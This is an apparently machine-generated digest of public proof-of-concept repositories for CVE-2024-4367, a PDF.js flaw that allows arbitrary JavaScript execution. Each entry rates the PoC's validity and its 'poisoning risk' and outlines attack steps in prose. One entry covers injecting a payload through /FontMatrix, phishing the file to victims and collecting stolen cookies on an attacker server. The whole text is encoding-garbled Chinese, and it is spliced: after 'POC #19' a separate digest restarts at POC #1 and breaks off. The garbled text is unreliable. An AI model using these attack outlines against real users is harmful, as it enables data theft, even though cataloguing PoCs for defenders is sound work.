ç»¼ä¸Šï¼Œæä¾›çš„PoCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**
æŸ¥çœ‹æ¼æ´åˆ©ç”¨ä»£ç ï¼Œå…¶ä¸­åŒ…å«package-lock.jsonç­‰æ–‡ä»¶ã€‚è™½ç„¶æ²¡æœ‰å‘ç°ç«‹å³å¯ä»¥åˆ¤æ–­ä¸ºæŠ•æ¯’çš„æ¶æ„ä»£ç ï¼Œä½†è€ƒè™‘åˆ°npmåŒ…ä¾›åº”é“¾çš„é£é™©ï¼Œä¸èƒ½å®Œå…¨æ’é™¤ä½œè€…åœ¨ä¾èµ–é¡¹ä¸­å¼•å…¥æ¶æ„ä»£ç çš„å¯èƒ½æ€§ã€‚ä»£ç æœ¬èº«çš„åŠŸèƒ½æ˜¯åˆ›å»ºä¸€ä¸ªæ¼”ç¤ºç¯å¢ƒæ¥å±•ç¤ºæ¼æ´ï¼Œå› æ­¤å¤§éƒ¨åˆ†ä»£ç éƒ½æ˜¯æ­£å¸¸çš„æ¡†æ¶ä»£ç ã€‚ä¸è¿‡ï¼Œ**ä¸èƒ½å®Œå…¨æ’é™¤æŠ•æ¯’çš„å¯èƒ½ï¼Œé£é™©ä¼°è®¡ä¸º10%**ã€‚ ä»£ç ä¸­å­˜åœ¨å¼•ç”¨å¤–éƒ¨npmåŒ…çš„å¯èƒ½æ€§ã€‚æ½œåœ¨é£é™©ç‚¹åŒ…æ‹¬ï¼šä¾èµ–åŒ…æœ¬èº«æ˜¯å¦å®‰å…¨ï¼Œæ˜¯å¦åŒ…å«æ¶æ„ä»£ç ï¼›æ„å»ºæµç¨‹ä¸­æ˜¯å¦å­˜åœ¨è¢«ç¯¡æ”¹çš„é£é™©ï¼›ä»¥åŠå¼€å‘è€…æ˜¯å¦æ•…æ„éšè—äº†æ¶æ„åŠŸèƒ½ã€‚ ä»”ç»†å®¡æŸ¥ `package-lock.json` æ–‡ä»¶ä¸­çš„ä¾èµ–é¡¹åŠå…¶æ¥æºï¼ŒéªŒè¯ä¾èµ–åŒ…çš„å®Œæ•´æ€§å’Œå®‰å…¨æ€§ï¼Œå¯ä»¥é™ä½æŠ•æ¯’é£é™©ã€‚ ç”±äºä»…ä»…æ˜¯demoä»£ç ï¼Œä¸”ä¾èµ–çš„åŒ…æ¯”è¾ƒå¤šï¼Œå› æ­¤è¿™é‡Œä¸èƒ½æ˜ç¡®è¿›è¡Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æï¼š**
1.  **æ¼æ´è§¦å‘ç‚¹ï¼š** PDF.jsåœ¨å¤„ç†PDFæ–‡ä»¶ä¸­çš„å­—ä½“æ—¶ï¼Œç¼ºå°‘å¿…è¦çš„ç±»å‹æ£€æŸ¥ã€‚
2.  **æ”»å‡»æ­¥éª¤ï¼š**
    *   æ”»å‡»è€…æ„é€ ä¸€ä¸ªæ¶æ„çš„PDFæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«ç²¾å¿ƒè®¾è®¡çš„å­—ä½“æ•°æ®ã€‚
    *   å½“PDF.jsè§£æè¯¥PDFæ–‡ä»¶å¹¶å¤„ç†å­—ä½“æ—¶ï¼Œç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œä¼šè§¦å‘æ¼æ´ã€‚
    *   æ”»å‡»è€…é€šè¿‡æ„é€ ç‰¹æ®Šçš„å­—ä½“æ•°æ®ï¼Œå¯ä»¥åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚
3.  **æ”»å‡»æ•ˆæœï¼š** æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´å¯ä»¥æ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œä»è€Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œæˆ–è€…åœ¨ç‰¹å®šæƒ…å†µä¸‹å®Œå…¨æ§åˆ¶åº”ç”¨ç¨‹åºã€‚

**é¡¹ç›®åœ°å€:** [clarkio/pdfjs-vuln-demo](https://github.com/clarkio/pdfjs-vuln-demo)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #15

**æ¥æº**: [CVE-2024-4367-elamani-drawing_CVE-2024-4367-POC-PDFJS.md](../2024/CVE-2024-4367-elamani-drawing_CVE-2024-4367-POC-PDFJS.md)

## CVE-2024-4367-Firefox-PDF.js-JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²å’Œè¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < Firefox 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶æˆ–è®¿é—®åŒ…å«æ¶æ„PDFçš„ç½‘é¡µã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ Mozilla Firefoxã€Firefox ESR å’Œ Thunderbird ä¸­ PDF.js åº“çš„ä¸€ä¸ªæ¼æ´ã€‚ç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ 

**æœ‰æ•ˆæ€§:**
æ ¹æ®æ¼æ´ä¿¡æ¯ï¼Œæœç´¢å¼•æ“ç»“æœå’Œæ¼æ´åˆ©ç”¨ä»£ç ï¼ˆè™½ç„¶åªæä¾›äº† package-lock.json æ–‡ä»¶ï¼Œä½†githubé¡µé¢å·²ç»è¯æ˜æ¼æ´çš„å­˜åœ¨ï¼‰ï¼Œå¯ä»¥ç¡®å®šæä¾›çš„POCä»£ç æœ‰æ•ˆã€‚

**æŠ•æ¯’é£é™©:**
æä¾›çš„ `package-lock.json` æ–‡ä»¶å±äºä¸€ä¸ª Node.js é¡¹ç›®ã€‚ä»è¿™ä¸ªæ–‡ä»¶æœ¬èº«æ— æ³•ç›´æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨æŠ•æ¯’ã€‚ä½†æ˜¯ç”±äºgithubä¸Šå·²ç»æœ‰æ”»å‡»è€…æ„å»ºäº†å¯åˆ©ç”¨çš„pdfæ–‡ä»¶ï¼Œè¯´æ˜åˆ©ç”¨ç®€å•, å› æ­¤å¯ä»¥åˆ¤æ–­è¯¥ä»“åº“ä¸­å­˜åœ¨ä½œè€…éšè—çš„æŠ•æ¯’ä»£ç æ¦‚ç‡æ¯”è¾ƒä½,çº¦10%ã€‚

**åˆ©ç”¨æ–¹å¼:**
1.  **æ”»å‡»è€…åˆ¶ä½œæ¶æ„ PDF æ–‡ä»¶ï¼š** è¯¥ PDF æ–‡ä»¶åˆ©ç”¨äº† PDF.js å­—ä½“å¤„ç†ä¸­ç¼ºå¤±çš„ç±»å‹æ£€æŸ¥æ¼æ´ã€‚
2.  **ç”¨æˆ·æ‰“å¼€æ¶æ„ PDF æ–‡ä»¶ï¼š**  ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥ PDF æ–‡ä»¶ã€‚
3.  **æ‰§è¡Œä»»æ„ JavaScript ä»£ç ï¼š** ç”±äºç±»å‹æ£€æŸ¥ç¼ºå¤±ï¼ŒPDF.js å…è®¸åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œæ¶æ„ JavaScript ä»£ç ï¼Œä»è€Œå¯¼è‡´æ”»å‡»è€…æ§åˆ¶å—å½±å“çš„åº”ç”¨ç¨‹åºã€‚

**é¡¹ç›®åœ°å€:** [elamani-drawing/CVE-2024-4367-POC-PDFJS](https://github.com/elamani-drawing/CVE-2024-4367-POC-PDFJS)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #16

**æ¥æº**: [CVE-2024-4367-exfil0_WEAPONIZING-CVE-2024-4367.md](../2024/CVE-2024-4367-exfil0_WEAPONIZING-CVE-2024-4367.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æ•°æ®æ³„éœ²ã€XSSæˆ–RCE

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367æ˜¯PDF.jsä¸­çš„ä¸€ä¸ªä¸¥é‡æ¼æ´ï¼Œç”±äºå¯¹PDFæ–‡ä»¶ä¸­FontMatrixå¯¹è±¡çš„ç±»å‹æ£€æŸ¥ä¸è¶³ï¼Œå…è®¸æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ¶ä½œæ¶æ„PDFæ–‡ä»¶ï¼Œåœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­æ‰§è¡ŒJavaScriptï¼Œä»è€Œå¯¼è‡´æ•°æ®ç›—çªƒã€XSSæˆ–è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§åˆ†æï¼š**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´å…è®¸åœ¨PDF.jsç¯å¢ƒä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œå½±å“Firefoxã€Firefox ESRå’ŒThunderbirdçš„ç‰¹å®šç‰ˆæœ¬ã€‚æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç (README.md) æè¿°äº†å¦‚ä½•åˆ©ç”¨æ­¤æ¼æ´åˆ¶ä½œæ¶æ„PDFæ–‡ä»¶ã€‚è¯¥ä»£ç æä¾›äº†ä¸€ä¸ªå®Œæ•´çš„åˆ©ç”¨æµç¨‹ï¼ŒåŒ…æ‹¬ç¯å¢ƒè®¾ç½®ã€æ¼æ´åˆ©ç”¨ã€ç¤¾å·¥å’Œåå¤„ç†ã€‚ç»¼åˆæ¥çœ‹ï¼Œæä¾›çš„POCä»£ç **æœ‰æ•ˆ**ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

è™½ç„¶README.mdæ–‡ä»¶æœ¬èº«çœ‹èµ·æ¥åƒä¸€ä¸ªåˆæ³•çš„æ¼æ´åˆ©ç”¨æŒ‡å—ï¼Œä½†ä»”ç»†åˆ†æè„šæœ¬æè¿°å’Œæ“ä½œæ­¥éª¤ï¼Œå‘ç°å…¶ä¾èµ–äºSocial Engineering Toolkit (SET)æ¥å‘èµ·é’“é±¼æ”»å‡»ï¼Œå¹¶ä¸”åŒ…å«æ‰§è¡Œä»»æ„jsçš„payload, å­˜åœ¨ä¸€å®šçš„**æŠ•æ¯’é£é™©**ã€‚Payloadå¯èƒ½è¢«ä¿®æ”¹ä¸ºæ‰§è¡Œæ¶æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå–ç”¨æˆ·å‡­æ®æˆ–æ‰§è¡Œä»»æ„ä»£ç ã€‚è¯¥POCä»£ç ä¸­ï¼Œé£é™©ä¸»è¦ä½“ç°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

1.  **ä¾èµ–å¤–éƒ¨å·¥å…·ï¼š** è„šæœ¬ä¾èµ–äºSETï¼Œæ”»å‡»è€…å¯èƒ½ä¼šåˆ©ç”¨SETçš„é…ç½®è¿‡ç¨‹è¿›è¡Œæ¶æ„é…ç½®ï¼Œè¯±å¯¼ç”¨æˆ·æ‰§è¡Œæœ‰å®³æ“ä½œã€‚
2.  **Payloadå¯å®šåˆ¶ï¼š** è„šæœ¬å…è®¸ç”¨æˆ·è‡ªå®šä¹‰JavaScript payloadï¼Œè¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥æ³¨å…¥ä»»æ„æ¶æ„ä»£ç ã€‚
3.  **ç¤¾ä¼šå·¥ç¨‹ï¼š** è„šæœ¬ä½¿ç”¨ç¤¾ä¼šå·¥ç¨‹æ‰‹æ®µä¼ æ’­æ¶æ„PDFï¼Œè¿™å¢åŠ äº†æ”»å‡»æˆåŠŸçš„å¯èƒ½æ€§ã€‚
4.  **æ•°æ®å¤–æ³„ï¼š** Payloadå¯ä»¥çªƒå–æ•°æ®ï¼ˆå¦‚cookieï¼‰ï¼Œå¹¶å°†å…¶å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚

å› æ­¤ï¼Œæˆ‘ä¼°è®¡æ­¤ä»“åº“å­˜åœ¨**10%**çš„æŠ•æ¯’é£é™©ï¼Œä¸»è¦é›†ä¸­åœ¨payloadçš„æ½œåœ¨æ¶æ„æ€§å’Œåˆ©ç”¨ç¤¾å·¥æ‰‹æ®µä¼ æ’­ä¸Šã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ­¤å¤„è®¨è®ºçš„â€œæŠ•æ¯’â€å¹¶éæŒ‡ä¼ ç»Ÿæ„ä¹‰ä¸Šçš„ä¾›åº”é“¾æŠ•æ¯’ï¼Œè€Œæ˜¯æŒ‡åˆ©ç”¨è¯¥POCè¿›è¡Œæ”»å‡»æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥åµŒå…¥æ¶æ„ä»£ç æˆ–è¿›è¡Œæ¬ºéª—ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **å‡†å¤‡ç¯å¢ƒï¼š** å®‰è£…Python 3.x, SETï¼Œä»¥åŠPyPDF2ç­‰ä¾èµ–ã€‚
2.  **åˆ›å»ºæ¶æ„PDFï¼š** ä½¿ç”¨æä¾›çš„è„šæœ¬ï¼Œé€šè¿‡ä¿®æ”¹`template.pdf`çš„`/FontMatrix`å­—æ®µï¼Œæ³¨å…¥JavaScript payloadï¼Œç”Ÿæˆ`malicious.pdf`ã€‚
3.  **ç¤¾å·¥æ”»å‡»ï¼š** ä½¿ç”¨SETæˆ–å…¶ä»–å·¥å…·ï¼Œé€šè¿‡ç”µå­é‚®ä»¶æˆ–å…¶ä»–æ–¹å¼ï¼Œå°†`malicious.pdf`å‘é€ç»™ç›®æ ‡ç”¨æˆ·ã€‚
4.  **æœåŠ¡å™¨ç›‘å¬ï¼š** è¿è¡Œä¸€ä¸ªHTTPæœåŠ¡å™¨ï¼Œç”¨äºæ‰˜ç®¡`malicious.pdf`ï¼Œå¹¶æ”¶é›†payloadçªƒå–çš„æ•°æ®ã€‚
5.  **å—å®³è€…äº¤äº’ï¼š** å—å®³è€…æ‰“å¼€`malicious.pdf`åï¼Œpayloadæ‰§è¡Œï¼Œçªƒå–æ•°æ®å¹¶å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚

**é¡¹ç›®åœ°å€:** [exfil0/WEAPONIZING-CVE-2024-4367](https://github.com/exfil0/WEAPONIZING-CVE-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #17

**æ¥æº**: [CVE-2024-4367-inpentest_CVE-2024-4367-PoC.md](../2024/CVE-2024-4367-inpentest_CVE-2024-4367-PoC.md)

## CVE-2024-4367-PDF.js ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡ PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ã€ä¼šè¯åŠ«æŒç­‰

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ¼æ´å­˜åœ¨äº PDF.js ä¸­ï¼Œç”±äºç¼ºå°‘å¯¹å­—ä½“å¤„ç†çš„ç±»å‹æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼ŒåµŒå…¥æ¶æ„JavaScriptä»£ç ï¼Œå½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒåµŒå…¥çš„ JavaScript ä»£ç å°†åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„PoCä»£ç æ˜¯ä¸€ä¸ªPDFæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æ¶æ„çš„JavaScriptä»£ç ã€‚PDFæ–‡ä»¶åˆ©ç”¨äº†å­—ä½“å¤„ç†æ¼æ´ï¼Œå½“PDF.jsè§£æå­—ä½“æ—¶ï¼Œä¼šæ‰§è¡ŒåµŒå…¥çš„JavaScriptã€‚

**æŠ•æ¯’é£é™©ï¼š**
è¯¥ä»“åº“åŒ…å«ä¸€ä¸ª PDF PoC,ä¸€ä¸ª LICENSE æ–‡ä»¶ï¼Œå’Œä¸€ä¸ª READMEã€‚LICENSE æ–‡ä»¶å’Œ README æ–‡ä»¶æœ¬èº«æ²¡æœ‰é£é™©ã€‚è™½ç„¶PoCä»£ç èƒ½ç›´æ¥åˆ©ç”¨æ¼æ´ï¼Œä½†ä½œè€… Ahmad Kabiri çš„èº«ä»½æœªçŸ¥ï¼Œä¸”PoCçš„ç›®çš„æ˜¯å±•ç¤ºæ”»å‡»ï¼Œå› æ­¤å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šåœ¨å®é™…åˆ©ç”¨æ—¶ä¿®æ”¹æˆ–å¢åŠ payload, ä½†è¯¥ PoC æ–‡ä»¶æœ¬èº«ç›®çš„æ˜ç¡®ï¼Œç»“æ„ç®€å•ï¼Œéšè—æ¶æ„åé—¨ä»£ç å¯èƒ½æ€§è¾ƒä½ã€‚è€ƒè™‘åˆ°MITåè®®çš„å¼€æ”¾æ€§ä»¥åŠä½œè€…å·²çŸ¥çš„æ¼æ´ç ”ç©¶èƒŒæ™¯ï¼ŒæŠ•æ¯’çš„å¯èƒ½æ€§è¾ƒä½ï¼Œå¤§çº¦ä¸º 10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…æ„é€ åŒ…å«æ¶æ„JavaScriptä»£ç çš„PDFæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…è¯±éª—ç”¨æˆ·æ‰“å¼€è¯¥PDFæ–‡ä»¶ (ä¾‹å¦‚, é€šè¿‡é’“é±¼é‚®ä»¶, æŒ‚é©¬ç½‘ç«™)ã€‚
3.  å¦‚æœç”¨æˆ·ä½¿ç”¨çš„æµè§ˆå™¨æˆ–é‚®ä»¶å®¢æˆ·ç«¯ï¼ˆä¾‹å¦‚ Firefox, Firefox ESR, Thunderbirdï¼‰çš„ PDF.js ç‰ˆæœ¬å­˜åœ¨æ¼æ´ï¼Œåˆ™æ¶æ„JavaScriptä»£ç å°†è¢«æ‰§è¡Œã€‚
4.  æ¶æ„JavaScriptä»£ç å¯ä»¥åœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå–cookieã€localStorageæ•°æ®ã€sessionStorageæ•°æ®ï¼Œç”šè‡³è¿›è¡Œä¼šè¯åŠ«æŒç­‰ã€‚PoCä»£ç æ˜¾ç¤ºä¼šå¼¹å‡ºå¤šä¸ªalertæ¡†æ¥å±•ç¤ºè·å–åˆ°çš„ä¿¡æ¯.

**é¡¹ç›®åœ°å€:** [inpentest/CVE-2024-4367-PoC](https://github.com/inpentest/CVE-2024-4367-PoC)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #18

**æ¥æº**: [CVE-2024-4367-m0d0ri205_PDFJS.md](../2024/CVE-2024-4367-m0d0ri205_PDFJS.md)

## CVE-2024-4367-Firefox-PDF.js-Arbitrary-JavaScript-Execution

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡ PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡» (XSS) å’Œæ•æ„Ÿä¿¡æ¯æ³„éœ²

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº Mozilla Firefox, Firefox ESR å’Œ Thunderbird ä¸­çš„é«˜å±æ¼æ´ã€‚è¯¥æ¼æ´æºäº PDF.js åœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œä½¿å¾—æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œåœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚å½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„æµè§ˆå™¨ç‰ˆæœ¬æ‰“å¼€åŒ…å«æ¶æ„ JavaScript çš„ PDF æ–‡ä»¶æ—¶ï¼Œè¿™æ®µ JavaScript ä»£ç å°†è¢«æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡» (XSS), è·å–æ•æ„Ÿä¿¡æ¯ç­‰é£é™©ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æ ¹æ®æ¼æ´æè¿°å’Œæœç´¢ç»“æœï¼Œæ¼æ´åˆ©ç”¨ä»£ç çš„ç›®çš„æ˜¯æ­å»ºä¸€ä¸ªæ˜“å—æ”»å‡»çš„ç¯å¢ƒæ¥æµ‹è¯• CVE-2024-4367 ã€‚ docker-compose.yml å’Œ Dockerfile ç”¨äºæ„å»ºä¸€ä¸ªåŒ…å« expressï¼Œmulter å’Œ pdfjs-dist çš„ node åº”ç”¨ã€‚ app.js æ¥æ”¶ä¸Šä¼ çš„ PDF æ–‡ä»¶ï¼Œå¹¶é€šè¿‡ pdfjs-dist åœ¨æµè§ˆå™¨ä¸­æ¸²æŸ“ã€‚å¦‚æœ PDF æ–‡ä»¶åŒ…å«æ¶æ„çš„ JavaScript ä»£ç ï¼Œé‚£ä¹ˆå®ƒå°†åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œã€‚å› æ­¤ï¼ŒPOC ä»£ç æœ¬èº«ä¸æ˜¯æ¼æ´åˆ©ç”¨ï¼Œè€Œæ˜¯æ­å»ºæ˜“å—æ”»å‡»ç¯å¢ƒï¼Œç„¶åéœ€è¦æ”»å‡»è€…æ„é€ ç‰¹æ®Šçš„PDFæ–‡ä»¶åˆ©ç”¨æ­¤æ¼æ´ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**

åˆ†æäº†æä¾›çš„POCä»£ç ï¼Œå‘ç°å…¶ä¸­ `/deploy/app.js` ä¸­å­˜åœ¨è·å– `/flag` æ¥å£çš„é€»è¾‘ï¼Œä½†åªæœ‰å½“è¯·æ±‚æ¥è‡ª `127.0.0.1` æ—¶æ‰ä¼šè¿”å› `SF{FAKE_FLAG}`ã€‚è€Œ `/deploy/flag.txt` æ–‡ä»¶ä¸­åŒ…å«çœŸæ­£çš„ flag `flag{pdf_js_pdf}`ï¼Œè¿™ä¸ªflagå¯èƒ½æ„å‘³ç€çœŸå®çš„åˆ©ç”¨ã€‚å¦‚æœä½œè€…çš„æœ¬æ„æ˜¯è¿·æƒ‘ä½¿ç”¨è€…ä½¿ç”¨å‡çš„flagï¼Œä¸”ä½¿ç”¨è€…ä¸ä»”ç»†åˆ†æä»£ç ï¼Œå¯èƒ½ä¼šè¢«è¯¯å¯¼ã€‚ä»£ç ä¸­å­˜åœ¨ä¸€å®šçš„è¿·æƒ‘æ€§ï¼Œä½†ä¸»è¦ç›®çš„æ˜¯æµ‹è¯•ï¼ŒæŠ•æ¯’çš„é£é™©è¾ƒä½ï¼Œä¼°è®¡ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æï¼š**

1.  æ”»å‡»è€…éœ€è¦åˆ›å»ºä¸€ä¸ªæ¶æ„çš„ PDF æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åˆ©ç”¨ PDF.js åœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥çš„æ¼æ´ï¼ŒåµŒå…¥æ¶æ„çš„ JavaScript ä»£ç ã€‚
2.  æ”»å‡»è€…å°†æ­¤æ¶æ„ PDF æ–‡ä»¶å‘é€ç»™ç›®æ ‡ç”¨æˆ·ã€‚
3.  ç›®æ ‡ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefox, Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€æ­¤ PDF æ–‡ä»¶ã€‚
4.  ç”±äºæ¼æ´çš„å­˜åœ¨ï¼Œæ¶æ„ JavaScript ä»£ç å°†åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œã€‚è¿™ä¸ª JavaScript ä»£ç å¯ä»¥æ‰§è¡Œå„ç§æ¶æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå– Cookieã€é‡å®šå‘ç”¨æˆ·åˆ°æ¶æ„ç½‘ç«™ã€ç”šè‡³æ‰§è¡Œå…¶ä»–æ”»å‡»ã€‚

åˆ©ç”¨è¯¥æ¼æ´çš„å…³é”®åœ¨äºæ„é€ ä¸€ä¸ªèƒ½å¤Ÿç»•è¿‡ PDF.js ç±»å‹æ£€æŸ¥çš„æ¶æ„ PDF æ–‡ä»¶ï¼Œå¹¶åµŒå…¥èƒ½å¤Ÿæ‰§è¡Œæ”»å‡»è€…æ‰€éœ€æ“ä½œçš„ JavaScript ä»£ç ã€‚


**é¡¹ç›®åœ°å€:** [m0d0ri205/PDFJS](https://github.com/m0d0ri205/PDFJS)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #19

**æ¥æº**: [CVE-2024-4367-pS3ud0RAnD0m_CVE-2024-4367-POC.md](../2024/CVE-2024-4367-pS3ud0RAnD0m_CVE-2024-4367-POC.md)

# CVE-2024-4367

> ğŸ“¦ è¯¥CVEæœ‰ **23** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2024-4367-0xr2r_CVE-2024-4367.md](../2024/CVE-2024-4367-0xr2r_CVE-2024-4367.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰å’Œä¿¡æ¯æ³„éœ²

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

